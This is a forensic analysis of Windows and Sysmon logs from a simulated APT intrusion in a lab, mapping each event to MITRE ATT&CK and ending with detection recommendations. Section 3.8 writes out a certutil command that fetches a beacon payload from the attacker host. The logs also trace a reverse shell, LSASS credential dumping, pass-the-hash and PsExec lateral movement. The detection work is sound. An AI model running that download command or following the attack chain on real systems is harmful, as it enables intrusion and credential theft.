# Event Log Analysis – APT Attack Chain Simulation

This document analyzes the Windows Security and Sysmon event logs generated during the simulated APT attack chain. It maps key events to the attack phases, identifies detection opportunities, and provides recommendations for improving monitoring and incident response.

---

## 1. Overview of Collected Logs

| Log Source | Event IDs | Hosts | Collection Method |
|------------|-----------|--------|-------------------|
| Windows Security | 4624, 4625, 4663, 4672, 4688, 4698, 5140, 5145 | WS1, DC | Winlogbeat |
| Sysmon | 1, 3, 10, 11 | WS1, DC | Sysmon |
| Windows System | 7036, 7045 | DC | Winlogbeat |

**Attack Window:** 2026-06-10 06:13:49 UTC – 2026-06-10 06:26:02 UTC

---

## 2. Attack Timeline

| Time (UTC) | Host | Event ID | Description | MITRE ATT&CK |
|------------|------|----------|-------------|--------------|
| 06:13:49 | WS1 | 4688 | `shell.exe` executed | T1059 - Command and Scripting Interpreter |
| 06:13:49 | WS1 | Sysmon 3 | Reverse shell connected to attacker | T1071 - Application Layer Protocol |
| 06:15:00 | WS1 | 4698 | Scheduled task `Updater` created | T1053.005 - Scheduled Task |
| 06:15:05 | WS1 | 4688 | `eventvwr.exe` spawned `cmd.exe` | T1548.002 - UAC Bypass |
| 06:15:10 | WS1 | Sysmon 10 | `shell.exe` accessed `lsass.exe` | T1003.001 - LSASS Memory |
| 06:15:10 | WS1 | 4663 | LSASS handle obtained | T1003.001 |
| 06:15:23 | DC | 4624 | NTLM network logon | T1550.002 - Pass the Hash |
| 06:15:23 | DC | 4672 | Privileged Administrator logon | Privilege Escalation |
| 06:15:23 | DC | 7045 | `PSEXESVC` service installed | T1021.002 - SMB/Windows Admin Shares |
| 06:15:24 | DC | 4688 | `PSEXESVC.exe` executed | Lateral Movement |
| 06:25:09 | DC | 4688 | `certutil.exe` downloaded `beacon.exe` | T1218 - Signed Binary Proxy Execution |
| 06:25:10 | DC | 4688 | `beacon.exe` executed | Execution |
| 06:25:10 | DC | Sysmon 3 | Outbound HTTP C2 connection | T1071.001 - Application Layer Protocol |

---

## 3. Analysis of Key Events

### 3.1 Initial Payload Execution

**Host:** WS1  
**Event ID:** 4688

```text
Process Name   : C:\Users\Public\shell.exe
Parent Process : C:\Windows\System32\cmd.exe
User           : WS1\WS-1
```

**Analysis**

- Executable launched from `C:\Users\Public`, an unusual location.
- Parent process was `cmd.exe`.
- Indicates initial payload execution.

---

### 3.2 Reverse Shell Connection

**Host:** WS1  
**Event ID:** Sysmon 3

```text
Source IP      : 192.168.1.20
Destination IP : 192.168.1.5
Destination    : TCP/4444
Process        : shell.exe
```

**Analysis**

An outbound reverse shell connection was established from WS1 to the attacker machine.

---

### 3.3 Scheduled Task Persistence

**Host:** WS1  
**Event ID:** 4698

```text
Task Name : Updater
Action    : C:\Users\Public\shell.exe
Trigger   : Daily 09:00
```

**Analysis**

Persistence was established through a scheduled task disguised as a legitimate updater.

---

### 3.4 LSASS Credential Access

**Host:** WS1

**Sysmon Event 10**

```text
Source Process : shell.exe
Target Process : lsass.exe
```

**Security Event 4663**

```text
Object Accessed : lsass.exe
Access Rights   : PROCESS_ALL_ACCESS
```

**Analysis**

A non-system process attempted privileged access to LSASS memory, indicating credential dumping activity.

---

### 3.5 Network Logon

**Host:** DC  
**Event ID:** 4624

```text
Logon Type             : 3
Authentication Package : NTLM
User                   : NATION\Administrator
Source IP              : 192.168.1.5
```

**Analysis**

A successful NTLM network logon from the attacker IP suggests lateral movement.

---

### 3.6 Privileged Logon

**Host:** DC  
**Event ID:** 4672

```text
User : NATION\Administrator
```

Administrative privileges were assigned immediately after authentication.

---

### 3.7 PsExec Service Installation

**Host:** DC  
**Event ID:** 7045

```text
Service Name : PSEXESVC
Image Path   : C:\Windows\temp\PSEXESVC.exe
```

**Analysis**

Installation of `PSEXESVC` indicates remote execution via PsExec.

---

### 3.8 beacon.exe Download

**Host:** DC  
**Event ID:** 4688

```cmd
certutil -urlcache -f http://192.168.1.5:8080/beacon.exe C:\Users\Public\beacon.exe
```

**Analysis**

`certutil.exe` was used as a Living-off-the-Land Binary (LOLBin) to download a payload.

---

### 3.9 beacon.exe Execution

```text
Process : C:\Users\Public\beacon.exe
Host    : DC
```

The downloaded payload was executed immediately after retrieval.

---

### 3.10 Command-and-Control Traffic

**Host:** DC  
**Event ID:** Sysmon 3

```text
Process          : beacon.exe
Destination IP   : 192.168.1.5
Destination Port : 8081
Protocol         : TCP
```

**Analysis**

Repeated outbound connections to the same endpoint indicate beaconing behavior.

---

## 4. Correlated Attack Chain

| Phase | Evidence |
|----------|----------|
| Initial Execution | `shell.exe` launched from `C:\Users\Public` |
| Reverse Shell | TCP connection to `192.168.1.5:4444` |
| Persistence | Scheduled task `Updater` |
| Credential Access | LSASS memory access |
| Lateral Movement | NTLM network logon and `PSEXESVC` installation |
| Payload Download | `certutil.exe` downloading `beacon.exe` |
| Command and Control | `beacon.exe` connecting to `192.168.1.5:8081` |

---

## 5. Key Indicators

- `C:\Users\Public\shell.exe`
- `C:\Users\Public\beacon.exe`
- `C:\Windows\temp\PSEXESVC.exe`
- Scheduled task `Updater`
- NTLM network logon from `192.168.1.5`
- `certutil.exe -urlcache`
- Outbound TCP connections to port `8081`
- LSASS access by `shell.exe`

---

## 6. Detection Recommendations

| Detection | Description |
|-----------|-------------|
| Executables from Public folder | Monitor binaries launched from `C:\Users\Public` |
| Scheduled task persistence | Alert on tasks executing from public directories |
| LSASS access | Detect non-system processes accessing `lsass.exe` |
| Pass-the-Hash | Monitor NTLM Type 3 logons from suspicious hosts |
| LOLBins | Detect `certutil.exe` downloading executables |
| Beaconing | Identify periodic outbound traffic to uncommon ports |

---

## 7. Conclusion

The event logs provide a complete timeline of the simulated intrusion, covering execution, persistence, credential access, lateral movement, payload deployment, and command-and-control communications. Correlating Windows Security events with Sysmon telemetry enables high-confidence detection and effective forensic reconstruction of attacker activity.